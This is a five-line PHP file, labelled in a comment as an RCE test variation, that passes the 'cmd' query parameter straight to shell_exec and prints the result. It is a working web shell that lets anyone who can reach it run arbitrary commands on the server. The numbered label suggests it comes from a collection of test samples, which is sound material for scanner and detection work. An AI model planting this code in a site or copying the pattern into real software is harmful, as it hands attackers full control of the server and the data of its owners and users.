<?php
// RCE test variation #253
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>